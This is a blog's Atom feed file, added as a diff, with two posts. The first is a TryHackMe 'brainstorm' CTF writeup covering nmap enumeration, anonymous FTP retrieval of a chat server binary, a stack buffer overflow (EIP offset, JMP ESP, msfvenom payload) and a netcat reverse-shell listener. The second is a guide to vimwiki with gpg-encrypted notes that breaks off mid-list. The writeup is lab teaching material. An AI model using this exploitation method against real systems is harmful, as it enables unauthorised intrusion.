@@ -1,0 +1,1077 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:base="https://ovelny.sh/">
+  <id>https://ovelny.sh/</id>
+  <title>ovelny</title>
+  <updated>2022-05-24T00:00:00Z</updated>
+  <link rel="alternate" href="https://ovelny.sh/" type="text/html"/>
+  <link rel="self" href="https://ovelny.sh/atom.xml" type="application/atom+xml"/>
+  <author>
+    <name>ovelny</name>
+    <uri>https://ovelny.sh</uri>
+  </author>
+  <entry>
+    <id>tag:ovelny.sh,2022-05-24:/blog/tryhackme-writeup-brainstorm/</id>
+    <title type="html">tryhackme writeup: brainstorm</title>
+    <published>2022-05-24T00:00:00Z</published>
+    <updated>2022-05-24T00:00:00Z</updated>
+    <link rel="alternate" href="https://ovelny.sh/blog/tryhackme-writeup-brainstorm/" type="text/html"/>
+    <content type="html">&lt;p&gt;for a while now, i&amp;#39;ve noticed that i let a lot of writeup drafts pile up without ever publishing them. usually when i get back to them, i forgot most of what the CTF was about and it becomes nightmarish to publish it.&lt;/p&gt;
+
+&lt;p&gt;the solution to this is obvious: just write the entire blog post while doing the CTF! which is something i&amp;#39;m gonna do for this tryhackme room.&lt;/p&gt;
+
+&lt;p&gt;brainstorm &lt;em&gt;should be&lt;/em&gt; a simple reverse engineering room, as it&amp;#39;s meant to practice basic stack-based buffer overflows. this should be fun and i definitely need that kind of refresher, so let&amp;#39;s begin!&lt;/p&gt;
+
+&lt;h2&gt;enumeration&lt;/h2&gt;
+
+&lt;p&gt;as usual, we&amp;#39;re going to scan and enumerate the network as we have to begin somewhere.&lt;/p&gt;
+
+&lt;h3&gt;nmap&lt;/h3&gt;
+
+&lt;p&gt;let&amp;#39;s run the following command, which will allow nmap to scan which services are running with their versions info, run standard scripts, keep scanning even if it doesn&amp;#39;t respond to ping and proceed faster for all of this:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;nmap &lt;span class="nt"&gt;-sV&lt;/span&gt; &lt;span class="nt"&gt;-sC&lt;/span&gt; &lt;span class="nt"&gt;-Pn&lt;/span&gt; &lt;span class="nt"&gt;-T4&lt;/span&gt; &amp;lt;ip-address&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;this outputs the following results:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;# Nmap 7.92 scan initiated Thu May 12 15:12:15 2022 as: nmap -sV -sC -T4 -Pn 10.10.106.144
+Nmap scan report for 10.10.106.144
+Host is up (0.031s latency).
+Not shown: 997 filtered tcports (no-response)
+PORT     STATE SERVICE            VERSION
+21/tcp   open  ftp                Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+3389/tcp open  ssl/ms-wbt-server?
+|_ssl-date: 2022-05-12T13:15:30+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=brainstorm
+| Not valid before: 2022-05-11T12:48:05
+|_Not valid after:  2022-11-10T12:48:05
+| rdp-ntlm-info: 
+|   Target_Name: BRAINSTORM
+|   NetBIOS_Domain_Name: BRAINSTORM
+|   NetBIOS_Computer_Name: BRAINSTORM
+|   DNS_Domain_Name: brainstorm
+|   DNS_Computer_Name: brainstorm
+|   Product_Version: 6.1.7601
+|_  System_Time: 2022-05-12T13:15:00+00:00
+9999/tcp open  abyss?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     Welcome to Brainstorm chat (beta)
+|     Please enter your username (max 20 characters): Write a message:
+|   NULL: 
+|     Welcome to Brainstorm chat (beta)
+|_    Please enter your username (max 20 characters):
+&amp;lt;snip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;website or web services&lt;/h3&gt;
+
+&lt;p&gt;n/a&lt;/p&gt;
+
+&lt;h3&gt;other services&lt;/h3&gt;
+
+&lt;p&gt;n/a&lt;/p&gt;
+
+&lt;h2&gt;relevant findings for exploitation&lt;/h2&gt;
+
+&lt;p&gt;our nmap output already tells us a lot:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;we have a FTP server running with anonymous login enabled (nice!)&lt;/li&gt;
+&lt;li&gt;we have a RDP port opened that will be useful to us later on&lt;/li&gt;
+&lt;li&gt;we have a custom program running with port 9999 opened, which is most likely going to be our target for reverse engineering in due time&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2&gt;exploitation&lt;/h2&gt;
+
+&lt;p&gt;first things first, let&amp;#39;s connect to the FTP server:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_1.jpg" alt="screenshot showing a connection to the FTP server with anonymous login allowed"&gt;&lt;/p&gt;
+
+&lt;p&gt;with anonymous login allowed, the credentials simply were anonymous:anonymous@ip-address.&lt;/p&gt;
+
+&lt;p&gt;i had some issues at this point with passive FTP mode and EPSV that prevented me to list directories: to disable those, simply run &lt;code&gt;passive&lt;/code&gt; and &lt;code&gt;epsv&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;running &lt;code&gt;dir&lt;/code&gt;, we can see the following directory:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_2.jpg" alt="screenshot showing a directory named &amp;quot;chatserver&amp;quot;, listed on the FTP server"&gt;&lt;/p&gt;
+
+&lt;p&gt;by listing the content in &lt;code&gt;chatserver&lt;/code&gt;, we can find a copy of chatserver.exe and its DLL:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_3.jpg" alt="screenshot showing the content of the &amp;quot;chatserver&amp;quot; directory. two files are present: chatserver.exe and essfunc.dll"&gt;&lt;/p&gt;
+
+&lt;p&gt;great! we can now download the program (and the DLL) to work on our buffer overflow, which we will then use on the real target (chatserver on port 9999).&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ftp&amp;gt; binary
+200 Type &lt;span class="nb"&gt;set &lt;/span&gt;to I.
+ftp&amp;gt; get chatserver.exe
+&lt;span class="nb"&gt;local&lt;/span&gt;: chatserver.exe remote: chatserver.exe
+200 PORT &lt;span class="nb"&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class="p"&gt;;&lt;/span&gt; Transfer starting.
+100% |&lt;span class="k"&gt;*********&lt;/span&gt; &amp;lt;snip&amp;gt;
+226 Transfer complete.
+43747 bytes received &lt;span class="k"&gt;in &lt;/span&gt;00:00 &lt;span class="o"&gt;(&lt;/span&gt;264.86 KiB/s&lt;span class="o"&gt;)&lt;/span&gt;
+ftp&amp;gt; get essfunc.dll
+&lt;span class="nb"&gt;local&lt;/span&gt;: essfunc.dll remote: essfunc.dll
+200 PORT &lt;span class="nb"&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class="p"&gt;;&lt;/span&gt; Transfer starting.
+100% |&lt;span class="k"&gt;*******&lt;/span&gt; &amp;lt;snip&amp;gt;
+226 Transfer complete.
+30761 bytes received &lt;span class="k"&gt;in &lt;/span&gt;00:00 &lt;span class="o"&gt;(&lt;/span&gt;238.18 KiB/s&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;quick aside: at this point i knew i had to use immunity debugger but couldn&amp;#39;t be bothered setting an entire windows VM just for this task. turns out that immunity debugger works fine with wine on kali! just make sure to set the env variable &lt;code&gt;winearch&lt;/code&gt; to &lt;code&gt;win32&lt;/code&gt; when installing it and you&amp;#39;ll be all set.&lt;/p&gt;
+
+&lt;p&gt;first things first, let&amp;#39;s see how the program behaves in a regular context. launching the &lt;code&gt;chatserver.exe&lt;/code&gt;, we get a prompt to create a username and we&amp;#39;re then free to send messages away:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_4.jpg" alt="screenshot showing a netcat connection being initiated on port 9999, used by chatserver.exe. a banner greets us and a prompt to enter our username and write a message appears."&gt;&lt;/p&gt;
+
+&lt;p&gt;the program outputs the following while listening for a connection and processing our username and messages:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_5.jpg" alt="chatserver.exe logs screenshot. it outputs a call for its needed DLL, essfunc, then it&amp;#39;s waiting for connections and once one has been established, outputs its address and port and finally the username that has been chosen."&gt;&lt;/p&gt;
+
+&lt;p&gt;we might trigger a buffer overflow when creating our username or sending a message — or both. let&amp;#39;s test that. the basic fuzzer that we&amp;#39;re using is the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_6.jpg" alt="a quick python script that does basic fuzzing on the app. it initiates the connection that we initially did manually, and sends an increasingly bigger string of &amp;quot;AAAAA&amp;quot; until chatserver crashes."&gt;&lt;/p&gt;
+
+&lt;p&gt;we quickly see that username creation implements a character limit so we won&amp;#39;t trigger anything with this input:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_7.jpg" alt="chatserver logs again, that show our script has been poorly thought out as it doesn&amp;#39;t account for the username creation step, which has a proper character limit and won&amp;#39;t overflow."&gt;&lt;/p&gt;
+
+&lt;p&gt;while editing the script to enter the username before fuzzing the app, i realized i could make it way simpler. i ended up rewriting it with the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_8.jpg" alt="rewrite of the previous pyton script, which includes the username creation step and is much more concise."&gt;&lt;/p&gt;
+
+&lt;p&gt;running the script, we notice that the app is crashing after sending 2100 bytes. we now have our starting point to work on the buffer overflow!&lt;/p&gt;
+
+&lt;p&gt;to find the EIP offset, we generate a pattern of 2400 bytes and whip up a short exploit script, quite simple like our fuzzing script:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_9.jpg" alt="brainstorm_9"&gt;&lt;/p&gt;
+
+&lt;p&gt;crashing the app, we get the following EIP register value:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_10.jpg" alt="brainstorm_10"&gt;&lt;/p&gt;
+
+&lt;p&gt;which allows us to find the EIP offset:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_11.jpg" alt="brainstorm_11"&gt;&lt;/p&gt;
+
+&lt;p&gt;by editing our exploit script, we can confirm that the EIP offset is correct:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_12.jpg" alt="brainstorm_12"&gt;&lt;/p&gt;
+
+&lt;p&gt;great, smooth sailing ahead of us. what we have to do next is sorting out the badchars and exploit the .dll for privilege escalation. mona will come in useful for the latter.&lt;/p&gt;
+
+&lt;p&gt;finding the badchars is a simple and boring process: we just add them to our payload and find out what went wrong in our esp dump.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_13.jpg" alt="brainstorm_13"&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_14.jpg" alt="brainstorm_14"&gt;&lt;/p&gt;
+
+&lt;p&gt;turns out we don&amp;#39;t have any badchars so we will be able to proceed without excluding them (except of course \x00). let&amp;#39;s work on the .dll file next.&lt;/p&gt;
+
+&lt;h2&gt;privilege escalation&lt;/h2&gt;
+
+&lt;p&gt;first, let&amp;#39;s take a look of the modules with mona. this is simply done with the &lt;code&gt;!mona modules&lt;/code&gt; command in immunity:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_15.jpg" alt="brainstorm_15"&gt;&lt;/p&gt;
+
+&lt;p&gt;we can see that &lt;code&gt;essfunc.dll&lt;/code&gt; is a perfect candidate for privilege escalation because it has no memory protections whatsoever. if we can find a &lt;code&gt;JMP ESP&lt;/code&gt; instruction that we can leverage for our payload, we should be good to go.&lt;br&gt;
+running &lt;code&gt;msf-nasm_shell&lt;/code&gt; on kali, we can see that the hex instruction for &lt;code&gt;JMP ESP&lt;/code&gt; is \xff\xe4:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_16.jpg" alt="brainstorm_16"&gt;&lt;/p&gt;
+
+&lt;p&gt;to find this instruction in &lt;code&gt;essfunc.dll&lt;/code&gt;, mona will again prove to be useful. running &lt;code&gt;!mona find -s &amp;quot;\xff\xe4&amp;quot; -m essfunc.dll&lt;/code&gt; allow us to get the pointers for the instruction we&amp;#39;re looking for:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_17.jpg" alt="brainstorm_17"&gt;&lt;/p&gt;
+
+&lt;p&gt;let&amp;#39;s pick the first one and check if this works. we simply adjust our script with the address and change its endianness to match our win x86 target:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_18.jpg" alt="brainstorm_18"&gt;&lt;/p&gt;
+
+&lt;p&gt;and we put a breakpoint in immunity for the same address. running the exploit again, we notice that we have indeed control of the EIP:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_20.jpg" alt="brainstorm_20"&gt;&lt;/p&gt;
+
+&lt;p&gt;we&amp;#39;re now ready to add the payload in our script and test it against the real target. to generate a payload, we use msfvenom with the following parameters to match the corresponding architecture of our target, add only the null byte to our list of badchars and make it play nicely with python:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_21.jpg" alt="brainstorm_21"&gt;&lt;/p&gt;
+
+&lt;p&gt;our script now looks like this (let&amp;#39;s not forget the nop sled too) and should hopefully be working:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_22.jpg" alt="brainstorm_22"&gt;&lt;/p&gt;
+
+&lt;p&gt;let&amp;#39;s set up a netcat listener before running it with &lt;code&gt;nc -lvnp 4444&lt;/code&gt;. and sure enough, we end up getting elevated privileges on our target, just as planned!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_23.jpg" alt="brainstorm_23"&gt;&lt;/p&gt;
+</content>
+  </entry>
+  <entry>
+    <id>tag:ovelny.sh,2021-07-31:/blog/switching-from-joplin-to-vimwiki/</id>
+    <title type="html">switching from joplin to vimwiki</title>
+    <published>2021-07-31T00:00:00Z</published>
+    <updated>2021-07-31T00:00:00Z</updated>
+    <link rel="alternate" href="https://ovelny.sh/blog/switching-from-joplin-to-vimwiki/" type="text/html"/>
+    <content type="html">&lt;p&gt;i&amp;#39;ve been using joplin for a while now, and have been mostly happy with it. it features a simple but sufficient vim keyboard mode, notes are encrypted, and images are easily pasted in markdown.&lt;/p&gt;
+
+&lt;p&gt;all in all this is great, but the following pain points made me reconsider this solution:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;the installation and update process is painful on linux: you need to run some shell script to get a proper install with shortcuts and icons, or you&amp;#39;re stuck with an appimage and all the related issues accompanying it. you could also use flatpak, but at the end of the day i&amp;#39;d just rather &lt;code&gt;sudo apt install joplin&lt;/code&gt; and move on with my life.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;uninstallation is even more painful. have fun running &lt;code&gt;sudo find / -iname &amp;quot;*joplin*&amp;quot; 2&amp;gt;/dev/null&lt;/code&gt; and sort things out on your own, which is sadly a common occurence with linux apps.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;no autocapitalisation. this is not a very common feature with most text editors, which i find surprising because this doesn&amp;#39;t &lt;em&gt;seem&lt;/em&gt; hard to implement?&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;joplin cloud plans. i&amp;#39;m not interested in this and just wish to keep things simple. syncing files with &lt;a href="https://syncthing.net/" rel="nofollow"&gt;syncthing&lt;/a&gt; is free and works amazingly well.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;having to use a GUI to write text. joplin does have a CLI interface, but learning a whole new system that mixes up custom commands with only a subset of vim commands doesn&amp;#39;t sound ideal to me.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;and last but certainly not least: electron. the only apps built with it that didn&amp;#39;t end up eating a frightening amount of RAM on my systems are vscode and discord, no other exceptions. i&amp;#39;m not too eager to sacrifice this just to simply type text.&lt;/p&gt;
+
+&lt;p&gt;vimwiki has been around for a while and has always intrigued me. as the name implies, this plugin allows you to maintain your own wiki via linked text files, with markdown support. but i would also need the following features to truly make it similar to joplin:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;seamless note encryption&lt;/li&gt;
+&lt;li&gt;syntax highlighting&lt;/li&gt;
+&lt;li&gt;markdown preview&lt;/li&gt;
+&lt;li&gt;easy way of pasting / linking images in markdown notes&lt;/li&gt;
+&lt;li&gt;autocapitalisation&lt;/li&gt;
+&lt;li&gt;easy syncing (already covered by syncthing)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;seems like some kind of deranged dream to expect all of these features from vim, but this is very doable with the following plugins:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;vim-markdown: &lt;a href="https://github.com/plasticboy/vim-markdown" rel="nofollow"&gt;https://github.com/plasticboy/vim-markdown&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;markdown-preview: &lt;a href="https://github.com/iamcco/markdown-preview.nvim" rel="nofollow"&gt;https://github.com/iamcco/markdown-preview.nvim&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;markdown-image-paste: &lt;a href="https://github.com/ferrine/md-img-paste.vim" rel="nofollow"&gt;https://github.com/ferrine/md-img-paste.vim&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;note encryption will be done via some vim scripting. let&amp;#39;s roll and set up everything!&lt;/p&gt;
+
+&lt;h2&gt;plugins installation&lt;/h2&gt;
+
+&lt;p&gt;first things first, let&amp;#39;s install all the plugins with your &lt;code&gt;.vimrc&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;Plug &lt;span class="s1"&gt;'plasticboy/vim-markdown'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s1"&gt;'for'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'markdown'&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+Plug &lt;span class="s1"&gt;'ferrine/md-img-paste.vim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s1"&gt;'for'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'markdown'&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+Plug &lt;span class="s1"&gt;'vimwiki/vimwiki'&lt;/span&gt;
+Plug &lt;span class="s1"&gt;'iamcco/markdown-preview.nvim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s1"&gt;'do'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="p"&gt;-&amp;gt;&lt;/span&gt; mkdp#util#install&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="s1"&gt;'for'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'markdown'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'vim-plug'&lt;/span&gt;&lt;span class="p"&gt;]}&lt;/span&gt;
+Plug &lt;span class="s1"&gt;'junegunn/goyo.vim'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;goyo is optional but provides an amazing, minimalist interface for notes — i highly recommend it. note that the following snippet is based on vim-plug: adapt it accordingly if you use another plugin manager, and run the appropriate install command (&lt;code&gt;:PlugInstall&lt;/code&gt; in my case).&lt;/p&gt;
+
+&lt;h2&gt;setting up encryption with markdown&lt;/h2&gt;
+
+&lt;p&gt;let&amp;#39;s populate our .vimrc with a few more settings to get seamless encryption. first we&amp;#39;re going to assign the .md.gpg extension to the markdown filetype, so vim can apply highlighting and other features like it normally would:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;BufEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="k"&gt;setlocal&lt;/span&gt; &lt;span class="k"&gt;filetype&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;markdown
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;the seamless editing of .gpg files will be handled by an edited mix of the following scripts:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://vim.fandom.com/wiki/Encryption" rel="nofollow"&gt;https://vim.fandom.com/wiki/Encryption&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://vim.fandom.com/wiki/Edit_gpg_encrypted_files#Comments" rel="nofollow"&gt;https://vim.fandom.com/wiki/Edit_gpg_encrypted_files#Comments&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;be aware that nothing is foolproof here, as vim uses temporary files when dealing with data from external programs. while those scripts harden everything as much as possible, you still might be able to retrieve some of your data with forensics—which is an accepted risk in my case.&lt;/p&gt;
+
+&lt;p&gt;one issue with those scripts used in conjunction with vimwiki is the management of buffers: vimwiki will open tons of them, and closing / saving them individually can prevent remaining files to remain tightly encrypted at rest.&lt;/p&gt;
+
+&lt;p&gt;the most practical solution i found is to always quit the wiki entirely, trust its autosaving feature and treat the bunch of buffers as a unique group this way. as such and to enforce this, i opted to remap &lt;code&gt;:wq&lt;/code&gt;, &lt;code&gt;:q&lt;/code&gt;, and disable &lt;code&gt;:w&lt;/code&gt; and &lt;code&gt;:q&lt;/code&gt; for the &lt;code&gt;.md.gpg&lt;/code&gt; filetype exclusively:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;VimEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;":cabbrev wq wqa"&lt;/span&gt;
+&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;VimEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;":cabbrev q qa"&lt;/span&gt;
+&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;VimEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;":cabbrev w &amp;lt;Nop&amp;gt;"&lt;/span&gt;
+&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;VimEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;":cabbrev wa &amp;lt;Nop&amp;gt;"&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;some people will find this to be cursed, and if you hate autosaving i feel you. on my end that solution works perfectly but i&amp;#39;m always open to suggestions!&lt;/p&gt;
+
+&lt;p&gt;next comes the automatic handling and editing of gpg files:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="c"&gt;" first make sure nothing is written to ~/.viminfo or backups while editing&lt;/span&gt;
+&lt;span class="c"&gt;" an encrypted file.&lt;/span&gt;
+&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;backupskip&lt;/span&gt;&lt;span class="p"&gt;+=&lt;/span&gt;*&lt;span class="p"&gt;.&lt;/span&gt;gpg
+&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;viminfo&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;
+
+augroup encrypted
+  &lt;span class="k"&gt;au&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;
+  &lt;span class="c"&gt;" disable swap file, undo file and backups, and set binary file format&lt;/span&gt;
+  &lt;span class="c"&gt;" before reading the file&lt;/span&gt;
+  autocmd &lt;span class="nb"&gt;BufReadPre&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;FileReadPre&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;gpg
+&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="k"&gt;setlocal&lt;/span&gt; &lt;span class="k"&gt;noswapfile&lt;/span&gt; &lt;span class="nb"&gt;noundofile&lt;/span&gt; &lt;span class="nb"&gt;nobackup&lt;/span&gt; &lt;span class="nb"&gt;bin&lt;/span&gt;
+  &lt;span class="c"&gt;" decrypt contents after reading the file, reset binary file format&lt;/span&gt;
+  &lt;span class="c"&gt;" and run any BufReadPost autocmds matching the filename without .gpg&lt;/span&gt;
+  autocmd &lt;span class="nb"&gt;BufReadPost&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;FileReadPost&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;gpg
+&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;"%!gpg --decrypt --default-recipient-self 2&amp;gt;/dev/null"&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="k"&gt;setlocal&lt;/span&gt; &lt;span class="nb"&gt;nobin&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;"redraw!"&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;"doautocmd BufReadPost "&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;expand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"%:r"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="c"&gt;" set binary file format and encrypt contents when leaving vim&lt;/span&gt;
+  autocmd Vimleave *&lt;span class="p"&gt;.&lt;/span&gt;gpg
+&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="k"&gt;setlocal&lt;/span&gt; &lt;span class="nb"&gt;bin&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="k"&gt;bufdo&lt;/span&gt; &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;"%!gpg --encrypt --armor --default-recipient-self"&lt;/span&gt;
+  &lt;span class="c"&gt;" contrary to the original scripts, we are not handling an undo command&lt;/span&gt;
+  &lt;span class="c"&gt;" to revert encryption in buffer: vimwiki auto-saves contents when quitting,&lt;/span&gt;
+  &lt;span class="c"&gt;" so we rather leave it at that and disable :w and :wa for .md.gpg files.&lt;/span&gt;
+  &lt;span class="c"&gt;" if you don't like auto-saving, sorry!&lt;/span&gt;
+augroup END
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;you will need to have a GPG keypair present on your system for this to work. if you don&amp;#39;t already have one, here&amp;#39;s how to do it:&lt;/p&gt;
+
+&lt;ul&gt;
